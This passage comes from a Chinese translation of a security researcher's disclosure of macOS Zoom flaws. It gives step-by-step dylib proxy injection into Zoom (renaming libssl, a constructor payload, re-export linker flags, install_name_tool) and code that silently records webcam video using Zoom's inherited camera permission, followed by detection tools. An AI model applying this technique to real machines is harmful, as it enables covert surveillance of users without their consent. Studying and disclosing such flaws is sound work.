      /System/Library/Frameworks/CoreServices.framework/Versions/A/CoreServices
由于macOS的系统完整性保护(SIP)，我们不能替换掉任何系统库。  
因此，如果想对一个应用程序使用dylib
proxying，先决条件就是程序必须从它自己的包或另一个非SIP的位置加载一个库(而且这个库必须是未经过“hardened
runtime”编译的(除非它有com.apple.security.cs.disable-library-validation这一entitlement)）。
观察Zoom的的库依赖，我们可以发现[@rpath](https://github.com/rpath
"@rpath")/curl64.framework/Versions/A/curl64，通过带-l参数的otool工具解析出其运行路径（[@rpath](https://github.com/rpath "@rpath")）：
    $ otool -l /Applications/zoom.us.app/Contents/MacOS/zoom.us 
    ...
    Load command 22
              cmd LC_RPATH
          cmdsize 48
             path @executable_path/../Frameworks (offset 12)
[@executable_path](https://github.com/executable_path
"@executable_path")将在运行时解析为二进制文件的路径，因此dylib将从以下位置加载：/Applications/zoom.us.app/Contents/MacOS/../Frameworks，更具体一点是/Applications/zoom.us.app/Contents/Frameworks。
通过Zoom的应用程序包，我们可以确认curl的存在（以及其他许多框架和库）且他们会在Zoom启动时全部加载：  
对于运行路径（[@rpath](https://github.com/rpath
"@rpath")）、执行路径（executable_path）和proxy dylib的更多细节，请移步以下链接：
[“Dylib Hijacking on OS
X”](https://www.virusbulletin.com/pdf/magazine/2015/vb201503-dylib-hijacking.pdf)
为了简单起见，我们将Zoom的libssl.1.0.0.dylib（因为它是一个独立的库，而不是框架/包）作为为我们要代理的库。
首先，重命名合法库，例如我们在库文件名前加一个前缀：`_libssl.1.0.0.dylib`。
现在，如果我们再运行Zoom，会造成意料之中的崩溃，因为缺少必要的库（libssl.1.0.0.dylib）。
    patrick$ /Applications/zoom.us.app/Contents/MacOS/zoom.us 
    dyld: Library not loaded: @rpath/libssl.1.0.0.dylib
    Referenced from: /Applications/zoom.us.app/Contents/Frameworks/curl64.framework/Versions/A/curl64
    Reason: image not found
    Abort trap: 6
这实际上是个好消息，因为这意味着如果我们将任何名为libssl.1.0.0.dylib的库放在Zoom的Frameworks目录下，dyld将会（盲目地）尝试加载它。
接下来，我们通过自定义的constructor创建一个简单的库（加载库时将自动调用）：
    1__attribute__((constructor))
     2static void constructor(void)
     3{
     4    char path[PROC_PIDPATHINFO_MAXSIZE];
     5    proc_pidpath (getpid(), path, sizeof(path)-1);
     6    
     7    NSLog(@"zoom zoom: loaded in %d: %s", getpid(), path);
     8
     9    return;
    10}
并将其保存至/Applications/zoom.us.app/Contents/Frameworks/libssl.1.0.0.dylib。
之后，重新运行Zoom：
    patrick$ /Applications/zoom.us.app/Contents/MacOS/zoom.us 
    zoom zoom: loaded in 39803: /Applications/zoom.us.app/Contents/MacOS/zoom.us
可以看到我们的库被Zoom成功加载~
但紧接着Zoom就闪退掉了，这是因为我们的libssl.1.0.0.dylib不是一个ssl库，提供不了任何程序需要的功能，所以Zoom无法启动。
不必担心，这正是dylib proxying的用武之地。
接下来，通过简单的链接器指令，我们可以告诉Zoom，“虽然我们的库没有实现您要查找的必需（ssl）功能，但我们知道谁可以提供”，之后将Zoom指向原始（合法）的ssl库（也就是被我们重命名为_libssl.1.0.0.dylib的库）。
整体流程图如下：  
为了创建所需的链接器指令，我们在Xcode的“`Other Linker Flags`” 下添加-XLinker
-reexport_library，然后添加目标代理库的路径：  
要完成代理库的创建，我们还必须更新嵌入式重导出路径reexport（在我们的代理dylib中），以便它指向（虽然已重命名）ssl库。Apple为此提供了install_name_tool工具：
    patrick$ install_name_tool -change @rpath/libssl.1.0.0.dylib /Applications/zoom.us.app/Contents/Frameworks/_libssl.1.0.0.dylib  /Applications/zoom.us.app/Contents/Frameworks/libssl.1.0.0.dylib
现在，我们可以（通过otool）确认我们的代理库引用了原始的ssl库。具体来说就是我们可以观察到在代理dylib中（libssl.1.0.0.dylib）包含一个LC_REEXPORT_DYLIB，它指向原始的ssl库（_libssl.1.0.0.dylib）：
    patrick$ otool -l /Applications/zoom.us.app/Contents/Frameworks/libssl.1.0.0.dylib 
    ...
    Load command 11
              cmd LC_REEXPORT_DYLIB
          cmdsize 96
             name /Applications/zoom.us.app/Contents/Frameworks/_libssl.1.0.0.dylib
       time stamp 2 Wed Dec 31 14:00:02 1969
          current version 1.0.0
    compatibility version 1.0.0
重新运行Zoom确认我们的代理库（和原始ssl库）均已加载，并且Zoom可以正常地运行！🔥  
向Zoom注入恶意库代码的魅力在于其（用户授予的）对麦克风和摄像头的访问权限。将我们的恶意程序库加载到Zoom的进程/地址空间后，
**该库将自动继承Zoom的所有访问权限** 。
这意味着，如果用户为Zoom提供了对麦克风和摄像头的访问权限（一种可能的情况），则我们注入的库也拥有访问这些设备的同等权限。
如果尚未授予Zoom访问麦克风或摄像头的权限，则我们的恶意库应能够检测到该情况并作出反应（悄悄关闭）。或者我们可以继续尝试访问设备，因为访问提示将“合法地”从Zoom发出，因此很可能会由不知情的用户批准。
为了测试这种“访问权限的继承”，我向注入的库中添加了一些代码，来录制几秒钟的网络摄像头视频：
     1 
     2  AVCaptureDevice* device = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
     3    
     4  session = [[AVCaptureSession alloc] init];
     5  output = [[AVCaptureMovieFileOutput alloc] init];
     6  
     7  AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:device 
     8                                error:nil];
     9
    10  movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];
    11  
    12  [self.session addInput:input];
    13  [self.session addOutput:output];
    14  [self.session addOutput:movieFileOutput];
    15  
    16  [self.session startRunning];
    17  
    18  [movieFileOutput startRecordingToOutputFileURL:[NSURL fileURLWithPath:@"zoom.mov"] 
    19                   recordingDelegate:self];
    20  
    21  //stop recoding after 5 seconds
    22  [NSTimer scheduledTimerWithTimeInterval:5 target:self 
    23           selector:@selector(finishRecord:) userInfo:nil repeats:NO];
    24  
    25  ...
在正常情况下此代码会触发来自macOS的警报，要求用户确认对麦克风和摄像头的访问。但是，当我们将其注入Zoom（已由用户确认访问）时，将不会显示其他提示，并且注入的代码可以任意录制音频和视频。
这项测试拍下了这项研究背后真正的主导者（狗头保命）：  
恶意软件是否可以在任意时间使用Zoom捕获音频和视频（即监视用户）。如果安装了Zoom并被授予访问麦克风和摄像头的权限，那么答案显而易见：可以！同时我们可以通过/usr/bin/open
-j 将程序隐藏起来。
## 总结
我们发现了两个影响Zoom（macOS版本）本地安全的漏洞。鉴于Zoom一直以来在隐私和安全方面的不良表现，这也是在我们的意料之中。
首先，我们展示了无特权攻击者或恶意软件如何利用Zoom的安装器获取root权限。
之后，由于特殊的entitlement，我们成功展示了如何将恶意库注入到Zoom的受信任进程上下文中。这使得恶意软件能够记录所有Zoom会议，甚至是在后台启动Zoom的情况下，能够在任意时间访问用户的麦克风和网络摄像头！😱
前者的问题在于许多企业（现在）使用Zoom来（可能）进行敏感的商务会议，而后者的问题在于即使没有macOS警报或提示，恶意软件仍然可以秘密地访问麦克风或网络摄像头。  
###  解决方法
老实说，如果您关心自己的安全或隐私，可以考虑停止使用Zoom。如果必须使用Zoom，可以使用我编写的一些免费工具来帮助检测这些攻击。😇
首先， [OverSight](https://objective-see.com/products/oversight.html)可以在任何人任何时间访问您的麦克风和摄像头时提醒您：  
因此，即使攻击者或恶意软件在后台运行Zoom，OverSight也会生成警报。
另一个（免费）工具是 [KnockKnock](https://objective-see.com/products/knockknock.html)，可以检测代理库：